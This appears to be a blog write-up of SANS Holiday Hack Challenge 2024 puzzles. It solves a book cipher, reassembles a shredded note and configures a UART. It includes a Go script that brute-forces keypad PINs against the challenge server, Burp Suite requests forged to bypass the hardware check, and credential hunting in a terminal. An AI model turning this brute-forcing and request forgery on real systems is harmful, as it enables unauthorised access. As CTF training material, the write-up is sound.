{{< image src="frosty-keypad/frosty-keypad-items.png" alt="The Frosty Book and UV Flashlight in the items menu." position="center" style="border-radius: 8px;" >}}

I think I've provided enough context and gathered enough information. I should
be able to work through this now.

### Solution (Silver)

When you click to connect to the `Frosty Keypad` you're met by a keypad with a
note. Objective behind this is we need to figure out how to enter the correct
codes to open the keypad.

{{< image src="frosty-keypad/frosty-keypad.png" alt="Image of the Frosty Keypad in the North Pole." position="center" style="border-radius: 8px;" >}}

If you make the note on the keypad a little larger. It shows the following
numbers. This kind of looks like the scheme for a book cipher.

{{< image src="frosty-keypad/note.png" alt="Enlarged image of the note stuck to the Frosty Keypad." position="center" style="border-radius: 8px;" >}}

There is a book that can be found amoungst the boxes. The note in the top-left
corner plays a crucial role for this alongside `The Frosty Book`. So, things are
starting to come together. I will be using `The Frosty Book` to decode the
cipher.

{{< image src="frosty-keypad/frosty-book.png" alt="Image of page 1 and 2 of the Frosty Book." position="center" style="border-radius: 8px;" >}}

This is an Ottendorf (Book) cipher. There are different encodings or variants of
this cipher that can be used. But, in this case the note encoded as 
`page:word:letter`.

Here is a list of the values in the note they encoded for this challenge.

- 2:6:1
- 4:10:3
- 6:1:1
- 3:10:4
- 14:8:3

When you put the pieces together. You get the following letters as the answer.

| Page | Word | Letter | Answer |
|-------|----|--------|------|
| 2 | 6 | 1 | S |
| 4 | 19 | 3 | A |
| 6 | 1 | 1 | N |
| 3 | 10 | 4 | T |
| 14 | 8 | 3 | A |

Basically the answer to this challenge is `SANTA` which is `72682` on the
numerical keypad. This will need to be entered manually into the keypad.

With that entered. It shows a message on the screen that says the code was
entered successfully and that we beat the code. Silver medal is provided and we
can move on to the next stage of the challenge.

### Solution (Gold)

Looks like the keypad accepts five digits. Otherwise it over writes the first
digit with the updated number. So we probably wont be dealing with digits
crossing the boundry of the input.

Looks like the numbers we're to be working with are `2768`. I initially tried it
in that order. But, it failed.

```js
 function checkOverlap() {
            clearOverlays();
            const keysToCheck = ['2', '7', '6', '8', 'Enter'];

            keysToCheck.forEach(key => {
```

Looked at all more information in the requests and the source code. Looked at
the requests and it looks like when it sends a submission to the keypad it uses
`/submit` with the `?id=$id` parameter. ID parameter was redacted so no one
could send these requests as my SHHC account.

```sh
https://hhc24-frostykeypad.holidayhackchallenge.com/submit?id=$id
```
```json
{"answer":""}
```

When you look at one of these post requests it sends the answer to the URL using
a JSON payload.

```json
{"answer":"2768"}
```

When you get an error; because I intend to filter out failures, it shows the
following repsonse.

```json
{"error":"The data you've provided seems to have gone on a whimsical adventure, losing all sense of order and coherence!"}
```

When you get a success output. It shows the following response from the server.

```json
{"output":"success"}
```

Here is the code I wrote for this. I've been learning `Go` lately and I wanted
to see the overhead associated with this.

One thing that I would probably change about this is rate limiting it a little.
It generates like `1024` PINs and sends them as an answer using a `for` loop.

```go
package main

import (
    "encoding/json"
    "fmt"
    "strconv"
    "log"
    "io"
    "bytes"
    "net/http"
)

type Answer struct {
    Answer string `json:"answer"`
}

func sendPinAttempt(url, userId, pin string) (result string, success bool) {
    var blindJsonMap map[string]interface{}

    reqUrl := fmt.Sprintf("%s%s", url, userId)

    answer := Answer{Answer: pin}

    answerJson, err := json.Marshal(answer)
    if err != nil {
        log.Fatalf("Error: %+v\n", err)
    }

    req, err := http.NewRequest("POST", reqUrl, bytes.NewBuffer(answerJson))
    if err != nil {
        log.Fatalf("Error: %+v\n", err)
    }

    req.Header.Set("Content-Type", "application/json; charset=UTF-8")
    req.Header.Set("User-Agent", "n3s0_frostykeypad-crack")

    client := &http.Client{}
    resp, err := client.Do(req)
    if err != nil {
        log.Fatalf("Error: %+v\n", err)
    }
    defer resp.Body.Close()

    body, err := io.ReadAll(resp.Body)
    if err != nil {
        log.Fatalf("Error: %+v\n", err)
    }

    err = json.Unmarshal([]byte(body), &blindJsonMap)
    if err != nil {
        log.Fatalf("Error: %+v\n", err)
    }

    _, ok := blindJsonMap["output"]
    if ok {
        result = fmt.Sprintf("%s", blindJsonMap["output"])
        success = true
    }

    if !ok {
        result = ""
        success = false
    }

    return
}

func GeneratePinCombinations(length int, knownNumbers []int, currentPin string, allPins *[]string) {
    if length == 0 {
        *allPins = append(*allPins, currentPin)
        return
    }

    for _, digit := range knownNumbers {
        GeneratePinCombinations(length-1, knownNumbers, currentPin+strconv.Itoa(digit), allPins)
    }
}

func main() {
    url := "https://hhc24-frostykeypad.holidayhackchallenge.com/submit?id="
    id := ""

    knownNumbers := []int{2, 7, 6, 8}
    pinLength := 5

    var allPossiblePins []string
    GeneratePinCombinations(pinLength, knownNumbers, "", &allPossiblePins)

    fmt.Printf("[i] Total Number of PINs: %d\n", len(allPossiblePins))

    for _, pin := range allPossiblePins {
        result, ok := sendPinAttempt(url, id, pin)
        if ok {
            fmt.Printf("[i]: { pin: %s, result: %s }\n", pin, result)
        }
    }
}
```

I ran the code using `go run main.go` in the directory and it works. After
waiting for a little bit. The output for the PIN showed up as a success.

```sh
[i] Total Number of PINs: 1024
[i] { pin: 22786, result: success }
```

After the new PIN showed up with the result. I stopped it from spraying.
Confirmed at the `Frosty Keypad` and it said the mission was a success. Gold
achievement was granted.

Out of that I got myself a random number generator and PIN cracker. I will be
uploading that to Github at some point.

## Hardware Hacking 101: Part 1

> Jingle all the wires and connect to Santa's Little Helper to reveal the merry 
> secrets locked in his chest!

Based on the image. This already looks like a great challenge. The visuals are
great and I get to play with some simulated hardware. Not sure I can beat that!

{{< image src="hardware-hacking/hardware-part1.png" alt="Image of hardware hacking 101 part 1" position="center" style="border-radius: 8px;" >}}

We start this off by talking to Jewel Loggins who is having issues accesing
something called Santa's Little Helper Tool and is wondering if we can help
them. They need to connect to the UART interface and start things up. But, it's 
not responding. With all of he right tools in place. They believe this is due 
to some incorrect settings.

The problem is. I don't have the correct settings either. But, Jewel Loggins
hints within the dialog that a note containing the serial settings exists. But,
one of Wombley's elves shredded it. So we're going to have to talk to Morcel
Nougate-he about a method of recovery for it. So, it's a good idea that we
decided to sol

> Hello there! I’m Jewel Loggins.
> 
> I hate to trouble you, but I really need some help. Santa’s Little Helper tool 
> isn’t working, and normally, Santa takes care of this… but with him missing, 
> it’s all on me.
> 
> I need to connect to the UART interface to get things running, but it’s like 
> the device just refuses to respond every time I try.
> 
> I've got all the right tools, but I must be overlooking something important. 
> I've seen a few elves with similar setups, but everyone’s so busy preparing 
> for Santa’s absence.
> 
> If you could guide me through the connection process, I’d be beyond grateful. 
> It’s critical because this interface controls access to our North Pole access 
> cards!
> 
> We used to have a note with the serial settings, but apparently, one of 
> Wombley’s elves shredded it! You might want to check with Morcel Nougat—he 
> might have a way to recover it.
>
> -- **Jewel Loggins (Front Yard (Act I))**

Some links to the web page for the Hardware Hacker 101: Part 1 challenge.

- [Hardware Hacking 101: Part 1](https://hhc24-hardwarehacking.holidayhackchallenge.com/)

**Hints:**

This discusses a shredder that the elves developed to shred documents into a
thousand pieces and it hints that we may need to reassemble a document for this
challenge.

> Shredded to Pieces
>
> From: Jewel Loggins
> 
> Terminal: Hardware Part 1
> 
> Have you ever wondered how elves manage to dispose of their sensitive documents? 
> Turns out, they use this fancy shredder that is quite the marvel of engineering. 
> It slices, it dices, it makes the paper practically disintegrate into a thousand 
> tiny pieces. Perhaps, just perhaps, we could reassemble the pieces?

### Solution (Silver)

A little image of the manual provided was useful for this challenge.

{{< image src="hardware-hacking/uart-slh-manual.png" alt="Image of hardware hacking 101 part 1 UART manual" position="center" style="border-radius: 8px;" >}}

To connect the wires we need to connect them like this on the UART. The voltage
pins (VCC and V) can be connected. As can the ground pins (GND and G). But, with
the Transmit/Recieve pins we want to connect Tx (transmit) on the UART to R
(recieve) on the device and the Rx (recieve) pin on the UART to the T (transmit)
pin on the device.

**NT2103 UART-Bridge:** PIN VCC -> **Santa's Little Helper (SLH):** PIN V
**NT2103 UART-Bridge:** PIN Tx  -> **Santa's Little Helper (SLH):** PIN R
**NT2103 UART-Bridge:** PIN Rx  -> **Santa's Little Helper (SLH):** PIN T
**NT2103 UART-Bridge:** PIN GND -> **Santa's Little Helper (SLH):** PIN G

This might also be best depicted in a picture as well. So, here it is.

{{< image src="hardware-hacking/hh-pinout.png" alt="Image of hardware hacking 101 part 1 with connected pins" position="center" style="border-radius: 8px;" >}}

With the wires connected. We'll want to make sure the toggle switch for the UART
device is set to 3V because the device we're connected to only supports 3V. If
it's toggled to 5V it will fry the device which is no fun. 

To power it on the UART device. You can do so using the `P` (power) button.

> Note: Before being able to solve this challenge. There is some information
> needed. We could attempt to brute force the settings using the code or we can
> go to the [Frosty Keypad](#frosty-keypad) challenge. I went to the Frosty
> Keypad Challenge before this one so I had what I needed. 
>
> When we solve that it gives us access to the shredded document. Which I 
> download and pieced together in the 
> [One Thousand Little Teeny Tiny Shredded Pieces of Paper](#one-thousand-little-teeny-tiny-shredded-pieces-of-paper)
> challenge. So that shold be referenced to provide more context as to how I
> recieved the settings for the serial connection.

Here is an image of the page that provides the settings for the serial
connection if no one wants to go back to the Frosty Keypad challenge.

{{< image src="thousand-tiny-pieces/assembled-image.png" alt="A note containing the settings for the serial connection." position="center" style="border-radius: 8px;" >}}

Below are the serial connection settings needed to start the connection.

- **BAUD:** 115200
- **PARITY:** EVEN
- **DATA:** 7 BITS
- **STOP BITS:** 1 BIT
- **FLOW CONTROL:** RTS

In case anyone needs a picture. There is one below with the correct serial
configuration.

{{< image src="hardware-hacking/serial-settings.png" alt="Image of hardware hacking 101 part 1 with correct serial config in UART" position="center" style="border-radius: 8px;" >}}

Once we have all of this information entered. We just press the `S` (serial)
button on the UART interface and if everything is correct. It will tell us we're
successful.

```txt
success! loading bootloader...
Go speak to Jewel Loggins for the next step!
```

For those who would like an image of this. I've provided one below.

{{< image src="hardware-hacking/successful-serial-connection.png" alt="Image of hardware hacking 101 part 1 successul serial connection" position="center" style="border-radius: 8px;" >}}

Jewel Loggins gives us some more dialog to confirm we're on the right track.

> Fantastic! You managed to connect to the UART interface—great work with those 
> tricky wires! I couldn't figure it out myself…
>
> -- **Jewel Loggins (Front Yard (Act I))**

### One Thousand Little Teeny Tiny Shredded Pieces of Paper

After cracking the code at the Frosty Keypad this is the prompt from Morcel
Nougat. Saying we retrieved the shredded document for what I think is the page
containing the serial settings that will help us in Hardware Hacking 101.

> Incredible work! You pieced together the code like a true sleuth and retrieved 
> the shreds we need. I’m not quite sure how you’ll put them all together, but if 
> anyone can, it’s you!
> 
> Your help has been absolutely essential, especially now with Santa missing. 
> Wombley and Alabaster will want to hear all about it—go share the news with 
> Jewel Loggins!
>
> -- **Morcel Nougat (Front Yard (Act I))**

**Hints:**

This hint provides a script that gives us the opportunity to piece the shredded
document back together from the looks of it.

> On the Cutting Edge
>
> From: Morcel Nougat
> 
> Terminal: Hardware Part 1
>
> Hey, I just caught wind of this neat way to piece back shredded paper! It's a 
> fancy heuristic detection technique—sharp as an elf’s wit, I tell ya! Got a 
> sample Python script right here, courtesy of Arnydo. Check it out when you 
> have a sec: [heuristic_edge_detection.py](https://gist.github.com/arnydo/5dc85343eca9b8eb98a0f157b9d4d719)."

**Items:**

After completing the silver part of the Frosty Keypad challenge. You are given
the following item to continue the journey. This is a link to to a zip file
containing one thousand parts of an image. 

> **One Thousand Little Teeny Tiny Shredded Pieces of Paper**
>
> A mountain of one thousand little tiny 
> [shredded pieces of paper](https://holidayhackchallenge.com/2024/shreds.zip)—each 
> scrap whispering a secret, waiting for the right hardware hacker to piece the 
> puzzle back together.

After downloading this zip file you can decompress and view its contents. It
looks like there is a `slices` directory conaining the pieces of the shredded
image.

```sh
total 2.6M
drwxr-xr-x 1 n3s0 n3s0  162 Oct 29 00:08 .
drwxr-xr-x 1 n3s0 n3s0  166 Oct 27 20:50 ..
-rw-r--r-- 1 n3s0 n3s0 1.6M Oct 27 16:51 shreds.zip
drwxrwxr-x 1 n3s0 n3s0  79K Oct 16  2024 slices
```

A look in this directory and you can see all of the image files. This isn't even
half of them. There are plenty more. Running `ls -l | wc -l` in the `slices`
directory counts to approximately 1001 files.

```sh
total 4.0M
drwxrwxr-x 1 n3s0 n3s0  79K Oct 16  2024 .
drwxr-xr-x 1 n3s0 n3s0  162 Oct 29 00:08 ..
-rw-rw-r-- 1 n3s0 n3s0 1.8K Oct 16  2024 002cc27c-a406-4b9c-97e3-e08d9db14571.jpg
-rw-rw-r-- 1 n3s0 n3s0 1.7K Oct 16  2024 0067d477-9f3a-4b46-b426-22868128fda9.jpg
-rw-rw-r-- 1 n3s0 n3s0 1.8K Oct 16  2024 00823d9b-2499-4f04-a8a8-b45776662bab.jpg
-rw-rw-r-- 1 n3s0 n3s0 1.6K Oct 16  2024 00b82e45-bd70-423b-b66b-f188f383635a.jpg
-rw-rw-r-- 1 n3s0 n3s0  980 Oct 16  2024 00d444a3-d1a1-4f06-85fe-e367c1264c16.jpg
-rw-rw-r-- 1 n3s0 n3s0 1.5K Oct 16  2024 012e2053-f8f0-497c-bd0b-0fc0ccfc28a0.jpg
-rw-rw-r-- 1 n3s0 n3s0 1.9K Oct 16  2024 01847bc9-cdbf-406c-9645-bde73407bf31.jpg
-rw-rw-r-- 1 n3s0 n3s0 1.8K Oct 16  2024 01e9c35a-3ebc-4552-a1ec-ed47bc8ab84f.jpg
-rw-rw-r-- 1 n3s0 n3s0 1.6K Oct 16  2024 01f14c4c-f7fc-4c64-b3c7-9f61c23f3fa6.jpg
-rw-rw-r-- 1 n3s0 n3s0 1.5K Oct 16  2024 022be568-6621-42b8-9938-b27b26fb9335.jpg
-rw-rw-r-- 1 n3s0 n3s0 1.7K Oct 16  2024 028aa098-4f96-4e21-8239-a38cf9b71944.jpg
-rw-rw-r-- 1 n3s0 n3s0 1.4K Oct 16  2024 02d9aeed-bb1f-4710-96c5-b7769e97af72.jpg
-rw-rw-r-- 1 n3s0 n3s0 2.0K Oct 16  2024 031979f7-f15a-4c22-8f52-9b46bcf393fe.jpg
-rw-rw-r-- 1 n3s0 n3s0 1.7K Oct 16  2024 037285db-85ca-46c5-b2f7-18783e16c580.jpg
-rw-rw-r-- 1 n3s0 n3s0 1012 Oct 16  2024 039153ad-fdba-4002-bb85-28b42b38e5f5.jpg
-rw-rw-r-- 1 n3s0 n3s0  980 Oct 16  2024 03b77db7-50a4-4e83-8005-a2d7c3f6f64e.jpg
-rw-rw-r-- 1 n3s0 n3s0 1.6K Oct 16  2024 03c4fa75-cde4-44a5-b554-9f1073f74979.jpg
-rw-rw-r-- 1 n3s0 n3s0 1.7K Oct 16  2024 042ccd6d-00ac-430a-9964-8d5d8ffcb674.jpg
...
```

To use the script provided to reassemble the image. I setup a virtual
environment for python using `venv`, activated the environment and proceeded to 
intall numpy and pillow. 

```sh
numpy==2.3.4
pillow==12.0.0
```

To run the script. I used python while the `venv` was activated. The script will
take each slice of the image can compare the edges to determine they match up.
Then it will save the image as `assembled_image.png` after it's iterated through 
the loop and put it all together.

```sh
python heuristic_edge_detection.py
```

I ran this initially and the image was backwards and it cuts off a lot of the
text. Making the settings hard to see.

{{< image src="thousand-tiny-pieces/jumbled-assembled-image.png" alt="Jumbled assembled image of serial configuration." position="center" style="border-radius: 8px;" >}}

After looking through the code sample I noticed the `slices[0]` array starts at
the first index in the array. Just because it's starting from the beginning of
the array doesn't mean that it's starting at the beginning of the image.

```python
def find_best_match(slices):
    n = len(slices)
    matched_slices = [slices[0]]
    slices.pop(0)

    while slices:
        last_slice = matched_slices[-1]
        differences = [calculate_difference(last_slice, s) for s in slices]
        best_match_index = np.argmin(differences)
        matched_slices.append(slices.pop(best_match_index))

    return matched_slices

```

After some trial and error I got a much cleaner image by updating this to
`slices[-8]`. Which would start roughly at index `991` if my math is right. 

```python
def find_best_match(slices):
    n = len(slices)
    matched_slices = [slices[-8]]
    slices.pop(0)

    while slices:
        last_slice = matched_slices[-1]
        differences = [calculate_difference(last_slice, s) for s in slices]
        best_match_index = np.argmin(differences)
        matched_slices.append(slices.pop(best_match_index))

    return matched_slices
```

Here is what the image looks like now that the code sample has been tuned. The
image is much easier to read after taking some time to figure that out.

{{< image src="thousand-tiny-pieces/assembled-image.png" alt="Assembled image of the serial configuration." position="center" style="border-radius: 8px;" >}}

If you read the image it will provide the information in the list below. This
information has also been added to the information in Hardware Hacking 101: Part
1 silver solution.

- **BAUD:** 115200
- **PARITY:** EVEN
- **DATA:** 7 BITS
- **STOP BITS:** 1 BIT
- **FLOW CONTROL:** RTS

Below is the full updated code sample of what worked for me on this challenge.

```python
import os
import numpy as np
from PIL import Image

def load_images(folder):
    images = []
    filenames = sorted(os.listdir(folder))
    for filename in filenames:
        if filename.endswith('.png') or filename.endswith('.jpg'):
            img = Image.open(os.path.join(folder, filename)).convert('RGB')
            images.append(np.array(img))
    return images

def calculate_difference(slice1, slice2):
    # Calculate the sum of squared differences between the right edge of slice1 and the left edge of slice2
    return np.sum((slice1[:, -1] - slice2[:, 0]) ** 2)

def find_best_match(slices):
    n = len(slices)
    matched_slices = [slices[-8]]
    slices.pop(0)

    while slices:
        last_slice = matched_slices[-1]
        differences = [calculate_difference(last_slice, s) for s in slices]
        best_match_index = np.argmin(differences)
        matched_slices.append(slices.pop(best_match_index))

    return matched_slices

def save_image(images, output_path):
    heights, widths, _ = zip(*(i.shape for i in images))

    total_width = sum(widths)
    max_height = max(heights)

    new_image = Image.new('RGB', (total_width, max_height))

    x_offset = 0
    for img in images:
        pil_img = Image.fromarray(img)
        new_image.paste(pil_img, (x_offset, 0))
        x_offset += pil_img.width

    new_image.save(output_path)

def main():
    input_folder = './slices'
    output_path = './assembled_image.png'

    slices = load_images(input_folder)
    matched_slices = find_best_match(slices)
    save_image(matched_slices, output_path)

if __name__ == '__main__':
    main()
```

### Solution (Gold)

I loved this challange! It took some time for me to read through the code and
dust off Burp Suite. But, it was a blast! I normally don't seek the opportunity
to read through client-side JavaScript. So connecting the dots made it a rather
run puzzle to solve.

> Rumor has it you might be able to bypass the hardware altogether for the gold 
> medal. Why not see if you can find that shortcut?
>
> -- **Jewel Loggins (Front Yard (Act I))**

I read the code for the `main.js` file and found a few tidbits that seemed
useful. There are some constants that contain arrays of the information needed
to solve the challenge.

```js
// PDA Screen Text Stuff
const baudRates = [300, 1200, 2400, 4800, 9600, 14400, 19200, 38400, 57600, 115200];
const dataBits = [5, 6, 7, 8];
const parityOptions = ["None", "odd", "even"];
const stopBits = [1, 2];
const flowControlOptions = ["None", "RTS/CTS", "Xon/Xoff", "RTS"];
const ports = ["COM1", "COM2", "COM3", "USB0"];
```

Reading through the `checkCondtions` method helped me understand how the
`checkit` function expects the *serial* array to be constructed. When the
settings are correct in the UART it starts up. But, if the voltage is at 5 it
creates too much heat.

```js
// Method to check the conditions
async checkConditions() {

    if (this.uV === 3 && this.allConnectedUp && !this.usbIsAtOriginalPosition || this.dev) {
        // console.log("PARTY TIME");
        let checkIt = await checkit([this.currentPortIndex, this.currentBaudIndex, this.currentParityIndex, this.currentDataIndex, this.currentStopBitsIndex, this.currentFlowControlIndex], this.uV)
        if (checkIt) {
            this.popup("success! loading bootloader...\nGo speak with Jewel Loggins for the next step!");
            this.yippee.play();
        } else {
            this.merp.play();
            this.popup("Serial connection couldn't be established...\nPlease check your settings and try again.");
        }

        // window.open('https://www.anotherexample.com', '_blank'); // Replace with your desired URL
        return true;
    } else {
        if (this.uV === 5 && this.allConnectedUp && !this.usbIsAtOriginalPosition) {
            const smoked = this.children.getByName('smoked');
            smoked.start();
            this.playAudioForDuration(this.smokey, 3000);
            this.time.delayedCall(3000, () => smoked.stop(), [], this);
        }
        // Power on fail phrases
        const tryagainphrases = [
            "Level incomplete! Keep playing!",
            "Insert coin to continue your quest!",
            "Continue? Time's running out!",
            "You haven't beaten the high score yet!",
            "Mission not accomplished! Retry?",
            "Game over? Not yet, give it another shot!",
            "The Force is not yet strong with this one.",
            "...",
        ];
        const tryagain = tryagainphrases[Math.floor(Math.random() * tryagainphrases.length)]
        console.log(`The Machine: "${tryagain}"`);

        // const voltage = vtoggle ? vtoggle.vol : "vtoggle not found";
        console.log(`Voltage: ${this.uV}, Wires Connected: ${this.allConnectedUp}, Power: False`);
        return false;
    }
}
```

The `checkit` function sends a post request with the user's request ID, the
index array for the serial config, and the voltage needed for powering
everything up.

There are some comments for the API discussing some issues where some elves
deviced to brute-force through v1 of the API. So they updated it to v2 and v1
**should** no longer be in production.


```js
async function checkit(serial, uV) {
  // Retrieve the request ID from the URL query parameters
  const requestID = getResourceID(); // Replace 'paramName' with the actual parameter name you want to retrieve

  if (!requestID) {
    requestID = "00000000-0000-0000-0000-000000000000";
  }

  // Build the URL with the request ID as a query parameter
  // Word on the wire is that some resourceful elves managed to brute-force their way in through the v1 API.
  // We have since updated the API to v2 and v1 "should" be removed by now.
  // const url = new URL(`${window.location.protocol}//${window.location.hostname}:${window.location.port}/api/v1/complete`);
  const url = new URL(`${window.location.protocol}//${window.location.hostname}:${window.location.port}/api/v2/complete`);

  try {
    // Make the request to the server
    const response = await fetch(url, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify({ requestID: requestID, serial: serial, voltage: uV })
    });

    // Check if the request was successful
    if (!response.ok) {
      throw new Error('Network response was not ok: ' + response.statusText);
    }

    const data = await response.json();
    console.log("Data", data)
    // Return true if the response is true
    return data === true;
  } catch (error) {
    console.error('There has been a problem with your fetch operation:', error);
    return false;
  }
}
```

Decided to start up a proxy in Burp Suite and use the intercept tool to capture
the requests. I looked through all of them to see if there was anything I could
send to repeater and I found this.

```http
GET /?&challenge=termHardwareHacking101A&username=n3s00&id=cd79c2f4-b255-41a6-a9bf-f4df6e09dc4e&area=frontyardact1&location=61,36&tokens=easy,termHardwareHacking101A&dna=ATATATTAATATATATATATGCATATATATATATCGATTAATATATATATATATATATATATATATATATGCATATGCCGATATATATATATTACGATATATATATATATGCATATATGC HTTP/2
Host: hhc24-hardwarehacking.holidayhackchallenge.com
Cookie: _ga_F6ZZNPR5E5=GS2.1.s1761618581$o11$g1$t1761623069$j60$l0$h0; _ga=GA1.1.1974479077.1761465328; GCLB="97885844805711ee"
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:144.0) Gecko/20100101 Firefox/144.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Sec-Fetch-User: ?1
If-Modified-Since: Mon, 23 Sep 2024 20:20:53 GMT
Priority: u=0, i
Te: trailers
```

Here is the response received from the server. It doesn't provide much. But, I
thought I'd include it anyway.

```http
HTTP/2 304 Not Modified
Last-Modified: Mon, 23 Sep 2024 20:20:53 GMT
Date: Tue, 28 Oct 2025 06:36:10 GMT
Via: 1.1 google
Alt-Svc: h3=":443"; ma=2592000,h3-29=":443"; ma=2592000
```

After sending the request to repeater. I updated it to the `POST` method with
the URL being `/api/v2/complete`. I tried it in `/api/v1/complete` as well.

I added the JSON payload to the body of the request after updating the
`Content-Type` and added the `Accept` headers to the request. Below is the JSON
used with the request ID, correct serial array, and the voltage index.

```json
{
"requestID":"cd79c2f4-b255-41a6-a9bf-f4df6e09dc4e",  
"serial": [3, 9, 2, 2, 0, 3], 
"voltage": 3
}
```

This is the request used in Burp Suite for this challenge. Provided for future
reference.

```http
POST /api/v2/complete HTTP/2
Host: hhc24-hardwarehacking.holidayhackchallenge.com
Cookie: _ga_F6ZZNPR5E5=GS2.1.s1761618581$o11$g1$t1761623069$j60$l0$h0; _ga=GA1.1.1974479077.1761465328; GCLB="97885844805711ee"
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:144.0) Gecko/20100101 Firefox/144.0
Content-Type: application/json
Accept: application/json
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Sec-Fetch-User: ?1
If-Modified-Since: Mon, 23 Sep 2024 20:20:53 GMT
Priority: u=0, i
Te: trailers
Content-Length: 105

{
"requestID":"cd79c2f4-b255-41a6-a9bf-f4df6e09dc4e",  
"serial": [3, 9, 2, 2, 0, 3], 
"voltage": 3
}
```

Below is the response. It does not provide much either. It just says `true`. So
I assume that's good. Originally I had one of the numbers off so it kept
returning `false` in the response. But, updating the wrong value fixed it.

```http
HTTP/2 200 OK
Content-Type: application/json
Date: Tue, 28 Oct 2025 05:50:09 GMT
Content-Length: 5
Via: 1.1 google
Alt-Svc: h3=":443"; ma=2592000,h3-29=":443"; ma=2592000

true
```

There is no prompt from Jewel Loggins after completing the Gold part of the
"Hardware Hacking 101: Part 1 challenge. But, I recieved the Gold acheivement
for the challenge on my badge to confirm.

## Hardware Hacking 101: Part 2

> Santa’s gone missing, and the only way to track him is by accessing the Wish 
> List in his chest—modify the access_cards database to gain entry!

{{< image src="hardware-hacking/hardware-part2.png" alt="Image of hardware hacking 101 part 2" position="center" style="border-radius: 8px;" >}}

The objective of this challenge is to grant access to card number 42 by
modifying the card database. This can be done using the `Santa's Little Helper 
(SLH)` tool. But, it's password protected. Once we've found the password we'll
be able to modify the card and move forward to the next challenge.

> Next, we need to access the terminal and modify the access database. We're 
> looking to grant access to card number 42.
>
> Start by using the slh application—that’s the key to getting into the access 
> database. Problem is, the ‘slh’ tool is password-protected, so we need to find 
> it first.
>
> Search the terminal thoroughly; passwords sometimes get left out in the open.
> 
> Once you've found it, modify the entry for card number 42 to grant access. 
> Sounds simple, right? Let’s get to it!
>
> -- **Jewel Loggins (Front Yard (Act I))**

### Solution (Silver)

Connected to the Hardware Hacking 101: Part 2 terminal and it went through its
post process to startup the `slhconsole`.
 
```sh
U-Boot SPL 2024.08 (Dec 24 2023 - 23:59:59 +0000)
Preparing sleigh for takeoff...


U-Boot 2024.08-g1234567-jolly (Dec 25 2023 - 00:00:01 +0000)

CPU:   North Pole CandyCane v1.0, eco 5
Clocks: CPU: 1000MHz, DDR: 1600MHz, Bus: 400MHz, XTAL: 50MHz
Model: Santa's Magic Access Control Board
DRAM:  256 MiB of Magic Memory
Loading Environment from SPI Flash... SF: Detected elf32magic with page size 512 Bytes, erase size 128 KiB, total 32 MiB
*** Warning - bad CRC, using default enchanted environment

In:    elvenconsole@1e000c00
Out:   elvenconsole@1e000c00
Err:   elvenconsole@1e000c00
Net:   
Warning: eth@1e100000 (eth0) using random MAC address - 5e:69:c8:f8:cf:5b
eth0: eth@1e100000
Hit any key to stop autoboot:  0 
Reindeer_PCIE_SET: gpio[19]=1
Using eth@1e100000 device
TFTP from server 192.168.54.25; our IP address is 192.168.54.5
Filename 'magic_firmware.bin'.
Load address: 0x80010000
Loading: *
North Pole Retry count exceeded; starting again
bash: cannot set terminal process group (9): Inappropriate ioctl for device
bash: no job control in this shell
```

After it's done booting up there are two options available.

1. Startup system (Default)
2. U-Boot console

For this challenge I went with the `Startup system` option. But, I might explore
the U-Boot console later. It might be useful during the "Gold" part of the
challenge.

```sh
*** U-Boot Boot Menu ***
> 1. Startup system (Default)
  2. U-Boot console
Press UP/DOWN to move, ENTER to select
```

Selecting the `Startup system` option displays the usage for the `Santa's Little
Helper - Access Card Maintenance Tool` and displays a terminal.

Based on the help. There are two options for granting card access. 0 for no
access and 1 for full access. I'll want to use 1 for the `--set-access` flag
when I finally have the password.

```sh
--------------------------------------------------------
                   ___     _      _  _   
                  / __|   | |    | || |  
                  \__ \   | |__  | __ |  
                  |___/   |____| |_||_|  
                _|"""""|_|"""""|_|"""""| 
                "`-0-0-'"`-0-0-'"`-0-0-' 
--------------------------------------------------------
  Santa's Little Helper - Access Card Maintenance Tool

          Tool Name: slh

options:
  -h, --help            show this help message and exit
  --view-config         View current configuration.
  --view-cards          View current values of all access cards.
  --view-card ID        View a single access card by ID.
  --set-access ACCESS_LEVEL
                        Set access level of access card. Must be 0 (No Access) or 1 (Full Access).
  --id ID               ID of card to modify.
  --passcode PASSCODE   Passcode to make changes.
  --new-card            Generate a new card ID.
--------------------------------------------------------
```

I listed the contents of the directory and I assumed I would see the
script/binary being used witin the home directory.

```sh
ls -lah
```

But, I was wrong. Looks like there is a file name `access_cards` sitting in
there owned by root. But, is read-only to anyone. So, it's possible that this is
the database file that contains the cards. Probably SQLite.

```sh
total 156K
drwxrwxr-t 1 slh  slh  4.0K Oct 28 02:41 .
drwxr-xr-x 1 root root 4.0K Nov 13  2024 ..
-r--r--r-- 1 slh  slh   518 Oct 16  2024 .bash_history
-r--r--r-- 1 slh  slh  3.9K Sep 23  2024 .bashrc
-r--r--r-- 1 slh  slh   807 Sep 23  2024 .profile
-rw-r--r-- 1 root root 128K Oct 28 02:41 access_cards
```

Used the `file(1)` command to check the file.

```sh
file access_cards 
```

It looks like I was right. This is a SQLite 3 database. I opened it in a text
editor and it had long strings that didn't seem to have a whole lot of meaning.
Unless they were cards and I'm not used to looking at badges in a terminal.

```sh
access_cards: SQLite 3.x database, last written using SQLite version 3040001, 
file counter 5, database pages 32, cookie 0x2, schema 4, UTF-8, version-valid-for 5
```

Upon further investigation, there is a schema. Although I can't pick it out from
the output further down. There is an access_cards table schema that I'm assuming
holds the data for the cards. But, we shall see.

```sh
?qGq��tableconfigconfigCREATE TABLE config (
            id INTEGER PRIMARY KEY,
            config_key TEXT UNIQUE,
            config_value TEXT
        )+?indexsqlite_autoindex_config_1confi�6%%�/tableaccess_cardsaccess_cardsCREATE TABLE access_cards (
            id INTEGER PRIMARY KEY,
            uuid TEXT,
            access INTEGER,
            sig TEXT
        ) ���������������������ysmga�O�+��c?�w�S�/�
�G    
```

At this point I'm just poking around to see what I can find. I noticed in the
directory listing there was a `.bash_history` file. So, I decided to run the
`history(1)` command to try my luck there.

